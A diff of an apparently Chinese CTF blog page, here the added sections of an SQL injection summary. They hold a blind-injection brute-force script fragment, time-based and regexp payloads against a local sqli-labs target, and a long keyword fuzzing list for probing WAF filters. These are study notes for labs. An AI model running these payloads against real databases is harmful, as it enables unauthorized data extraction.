class="string">&quot;&#x27;&quot;</span></span><br><span class="line">		response = requests.get(url%s)</span><br><span class="line">		print(url%s)</span><br><span class="line">		<span class="keyword">if</span> success_text <span class="keyword">in</span> response.text:</span><br><span class="line">			flag = <span class="number">1</span></span><br><span class="line">			ans = ans + c</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">if</span> flag == <span class="number">0</span>:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">print(ans)</span><br></pre></td></tr></table></figure>
 
 
+<h2 id="if"><a href="#if" class="headerlink" title="if"></a>if</h2><p>最常规的</p>
+<h2 id=""><a href="#" class="headerlink" title="^"></a>^</h2><p>1^1=0，1^0=1，用于过滤了if的报错注入</p>
+<h2 id="字符大小比较"><a href="#字符大小比较" class="headerlink" title="字符大小比较"></a>字符大小比较</h2><p>可用于if被过滤</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(select &#39;&#123;&#125;&#39;)&gt;(select * from f1ag_1s_h3r3_hhhhh)</span><br></pre></td></tr></table></figure>
 
 
-<h1 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h1><p>例题：less9、10</p>
+<h2 id="regexp"><a href="#regexp" class="headerlink" title="regexp"></a>regexp</h2><p>可用于if被过滤</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select user() regexp &#39;^r&#39; # 从user()中判断是否有以r字母开头的值，有的话返回1</span><br></pre></td></tr></table></figure>
+<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>例题：less9、10</p>
 <p>适用情况：能执行sleep()函数</p>
 <p>判断：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> ?id&#x3D;1&#39; and sleep(5) --+</span><br><span class="line">延时大概5秒，说明可以采用时间盲注</span><br></pre></td></tr></table></figure>
 <p>语句：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.64.2&#x2F;sqli&#x2F;Less-9&#x2F;?id&#x3D;1&#39; and if(length(database())&#x3D;7,sleep(5),1)%20--+</span><br><span class="line">有延迟，说明数据库名称长度为8</span><br></pre></td></tr></table></figure>
+<h1 id="sql常规关键字fuzz字典"><a href="#sql常规关键字fuzz字典" class="headerlink" title="sql常规关键字fuzz字典"></a>sql常规关键字fuzz字典</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br></pre></td><td class="code"><pre><span class="line">参考：https:&#x2F;&#x2F;www.cnblogs.com&#x2F;zhangqianxi&#x2F;p&#x2F;13452718.html</span><br><span class="line">length</span><br><span class="line">Length</span><br><span class="line">+</span><br><span class="line">handler</span><br><span class="line">likeLiKe</span><br><span class="line">selectSeleCT </span><br><span class="line">sleepSLEEp</span><br><span class="line">databaseDATABASe</span><br><span class="line">delete</span><br><span class="line">having</span><br><span class="line">oroR</span><br><span class="line">asAs</span><br><span class="line">-~</span><br><span class="line">BENCHMARK</span><br><span class="line">limitLimIt</span><br><span class="line">leftLeft</span><br><span class="line">selectSELECT</span><br><span class="line">insertinsERTINSERT</span><br><span class="line">right</span><br><span class="line">#</span><br><span class="line">--+</span><br><span class="line">INFORMATION</span><br><span class="line">--</span><br><span class="line">;</span><br><span class="line">!</span><br><span class="line">%</span><br><span class="line">+</span><br><span class="line">xor</span><br><span class="line">&lt;&gt;</span><br><span class="line">(</span><br><span class="line">&gt;</span><br><span class="line">&lt;</span><br><span class="line">)</span><br><span class="line">.</span><br><span class="line">^</span><br><span class="line">&#x3D;</span><br><span class="line">ANDANd</span><br><span class="line">BYBy</span><br><span class="line">CAST</span><br><span class="line">COLUMNCOlumn</span><br><span class="line">COUNTCount</span><br><span class="line">CREATE</span><br><span class="line">END</span><br><span class="line">case</span><br><span class="line">&#39;1&#39;&#x3D;&#39;1</span><br><span class="line">when</span><br><span class="line">admin&#39;</span><br><span class="line">&quot;</span><br><span class="line">length </span><br><span class="line">+</span><br><span class="line">REVERSE</span><br><span class="line"></span><br><span class="line">asciiASSICASSic</span><br><span class="line">select </span><br><span class="line">database</span><br><span class="line">left</span><br><span class="line">right</span><br><span class="line">unionUNIonUNION</span><br><span class="line">&quot;</span><br><span class="line">&amp;</span><br><span class="line">&amp;&amp;</span><br><span class="line">||</span><br><span class="line">oorr</span><br><span class="line">&#x2F;</span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line">&#x2F;&#x2F;*</span><br><span class="line">*&#x2F;*</span><br><span class="line">&#x2F;**&#x2F;</span><br><span class="line">anandd</span><br><span class="line">GROUP</span><br><span class="line">HAVING</span><br><span class="line">IF</span><br><span class="line">INTO</span><br><span class="line">JOIN</span><br><span class="line">LEAVE</span><br><span class="line">LEFT</span><br><span class="line">LEVEL</span><br><span class="line">sleep</span><br><span class="line">LIKE</span><br><span class="line">NAMES</span><br><span class="line">NEXT</span><br><span class="line">NULL</span><br><span class="line">OF</span><br><span class="line">ON</span><br><span class="line">|</span><br><span class="line">infromation_schema</span><br><span class="line">user</span><br><span class="line">OR</span><br><span class="line">ORDER</span><br><span class="line">ORD</span><br><span class="line">SCHEMA</span><br><span class="line">SELECT</span><br><span class="line">SET</span><br><span class="line">TABLE</span><br><span class="line">THEN</span><br><span class="line">UNION</span><br><span class="line">UPDATE</span><br><span class="line">USER</span><br><span class="line">USING</span><br><span class="line">VALUE</span><br><span class="line">VALUES</span><br><span class="line">WHEN</span><br><span class="line">WHERE</span><br><span class="line">ADD</span><br><span class="line">AND</span><br><span class="line">prepare</span><br><span class="line">set</span><br><span class="line">update</span><br><span class="line">delete</span><br><span class="line">drop</span><br><span class="line">inset</span><br><span class="line">CAST</span><br><span class="line">COLUMN</span><br><span class="line">CONCAT</span><br><span class="line">GROUP_CONCAT</span><br><span class="line">group_concat</span><br><span class="line">CREATE</span><br><span class="line">DATABASE</span><br><span class="line">DATABASES</span><br><span class="line">alter</span><br><span class="line">DELETE</span><br><span class="line">DROP</span><br><span class="line">floor</span><br><span class="line">rand()</span><br><span class="line">information_schema.tables</span><br><span class="line">TABLE_SCHEMA</span><br><span class="line">%df</span><br><span class="line">concat_ws()</span><br><span class="line">concat</span><br><span class="line">LIMIT</span><br><span class="line">ORD</span><br><span class="line">ON</span><br><span class="line">extractvalue</span><br><span class="line">order </span><br><span class="line">CAST()</span><br><span class="line">by</span><br><span class="line">ORDER</span><br><span class="line">OUTFILE</span><br><span class="line">RENAME</span><br><span class="line">REPLACE</span><br><span class="line">SCHEMA</span><br><span class="line">SELECT</span><br><span class="line">SET</span><br><span class="line">updatexml</span><br><span class="line">SHOW</span><br><span class="line">SQL</span><br><span class="line">TABLE</span><br><span class="line">THEN</span><br><span class="line">TRUE</span><br><span class="line">instr</span><br><span class="line">benchmark</span><br><span class="line">format</span><br><span class="line">bin</span><br><span class="line">substring</span><br><span class="line">ord</span><br><span class="line"></span><br><span class="line">UPDATE</span><br><span class="line">VALUES</span><br><span class="line">VARCHAR</span><br><span class="line">VERSION</span><br><span class="line">WHEN</span><br><span class="line">WHERE</span><br><span class="line">&#x2F;*</span><br><span class="line">&#96;</span><br><span class="line">  </span><br><span class="line">,</span><br><span class="line">users</span><br><span class="line">%0a%0A</span><br><span class="line">%0b</span><br><span class="line">mid</span><br><span class="line">for</span><br><span class="line">BEFORE</span><br><span class="line">REGEXP</span><br><span class="line">RLIKE</span><br><span class="line">in</span><br><span class="line">sys schemma</span><br><span class="line">SEPARATOR</span><br><span class="line">XOR</span><br><span class="line">CURSOR</span><br><span class="line">FLOOR</span><br><span class="line">sys.schema_table_statistics_with_buffer</span><br><span class="line">INFILE</span><br><span class="line">count</span><br><span class="line">%0c</span><br><span class="line">from</span><br><span class="line">%0d</span><br><span class="line">%a0</span><br><span class="line">&#x3D;</span><br><span class="line">@</span><br><span class="line">else</span><br><span class="line">or</span><br><span class="line">Or</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="regexp-1"><a href="#regexp-1" class="headerlink" title="regexp"></a>regexp</h1><p>用于显示不全，使用正则匹配搜索匹配的flag的情况</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;)</span><br></pre></td></tr></table></figure>
 
 
 <h1 id="sqllab题目"><a href="#sqllab题目" class="headerlink" title="sqllab题目"></a>sqllab题目</h1><h2 id="Less5"><a href="#Less5" class="headerlink" title="Less5"></a>Less5</h2><p>做法1：count()和floor()的查询注入</p>
@@ -351,7 +907,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2021/01/15/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/" data-id="ckk1u3o490000tsusezlp4y3h" data-title="SQL注入总结" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2021/01/15/CTF-Web-SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/" data-id="ckkdrz0yy0001ugusdm9dcp4m" data-title="SQL注入总结" class="article-share-link">Share</a>
       
       
       
@@ -410,9 +966,9 @@
 
 
   
-    <article id="post-CTF答案记录" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-CTF-wp-攻防世界答案记录" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2020/12/31/CTF%E7%AD%94%E6%A1%88%E8%AE%B0%E5%BD%95/" class="article-date">
+    <a href="/2020/12/31/CTF-wp-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E7%AD%94%E6%A1%88%E8%AE%B0%E5%BD%95/" class="article-date">
   <time class="dt-published" datetime="2020-12-31T06:40:57.000Z" itemprop="datePublished">2020-12-31</time>
 </a>
     
@@ -424,7 +980,7 @@
         
   
     <h1 itemprop="name">
-      <a class="p-name article-title" href="/2020/12/31/CTF%E7%AD%94%E6%A1%88%E8%AE%B0%E5%BD%95/">CTF答案记录</a>
+      <a class="p-name article-title" href="/2020/12/31/CTF-wp-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E7%AD%94%E6%A1%88%E8%AE%B0%E5%BD%95/">CTF答案记录</a>
     </h1>
   
 
@@ -1087,7 +1643,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2020/12/31/CTF%E7%AD%94%E6%A1%88%E8%AE%B0%E5%BD%95/" data-id="ckk1u3o4n0004tsus49echjil" data-title="CTF答案记录" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2020/12/31/CTF-wp-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E7%AD%94%E6%A1%88%E8%AE%B0%E5%BD%95/" data-id="ckkdrz0z70007ugus60u76cr9" data-title="CTF答案记录" class="article-share-link">Share</a>
       
       
       
@@ -1200,45 +1756,12 @@
 
 
   
-    <article id="post-hello-my-blog" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2020/12/22/hello-my-blog/" class="article-date">
-  <time class="dt-published" datetime="2020-12-22T08:02:53.000Z" itemprop="datePublished">2020-12-22</time>
-</a>
+
+
+  <nav id="page-nav">
     
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2020/12/22/hello-my-blog/">hello my blog</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2020/12/22/hello-my-blog/" data-id="ckk1u3o4h0001tsus1mci359t" data-title="hello my blog" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
+  </nav>
 
 </section>
         
@@ -1251,7 +1774,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tags</h3>
     <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%91%98%E6%8A%84/" rel="tag">摘抄</a></li></ul>
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%91%98%E6%8A%84/" rel="tag">摘抄</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%AD%94%E6%A1%88/" rel="tag">答案</a></li></ul>
     </div>
   </div>
 
@@ -1261,7 +1784,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tag Cloud</h3>
     <div class="widget tagcloud">
-      <a href="/tags/%E6%91%98%E6%8A%84/" style="font-size: 10px;">摘抄</a>
+      <a href="/tags/%E6%91%98%E6%8A%84/" style="font-size: 10px;">摘抄</a> <a href="/tags/%E7%AD%94%E6%A1%88/" style="font-size: 10px;">答案</a>
     </div>
   </div>
 
@@ -1283,23 +1806,23 @@
       <ul>
         
           <li>
+            <a href="/2021/01/25/CTF-Web-SQL%E6%B3%A8%E5%85%A5WAF%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/">SQL注入WAF绕过姿势</a>
+          </li>
+        
+          <li>
+            <a href="/2021/01/24/CTF-wp-wechall%E7%AD%94%E6%A1%88/">wechall答案</a>
+          </li>
+        
+          <li>
+            <a href="/2021/01/22/CTF-Web-php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%80%BB%E7%BB%93/">php伪协议总结</a>
+          </li>
+        
+          <li>
+            <a href="/2021/01/20/CTF-Web-SQL%E6%B3%A8%E5%85%A5/">CTF-Web-SQL注入</a>
+          </li>
+        
+          <li>
             <a href="/2021/01/19/%E6%91%98%E6%8A%84-%E3%80%8A%E9%80%9A%E5%BE%80%E5%A5%B4%E5%BD%B9%E4%B9%8B%E8%B7%AF%E3%80%8B/">摘抄-《通往奴役之路》</a>
-          </li>
-        
-          <li>
-            <a href="/2021/01/19/CTF-Web-PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">CTF_Web PHP代码审计</a>
-          </li>
-        
-          <li>
-            <a href="/2021/01/15/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/">SQL注入总结</a>
-          </li>
-        
-          <li>
-            <a href="/2021/01/12/hello-world/">Hello World</a>
-          </li>
-        
-          <li>
-            <a href="/2020/12/31/CTF%E7%AD%94%E6%A1%88%E8%AE%B0%E5%BD%95/">CTF答案记录</a>
           </li>
         
       </ul>
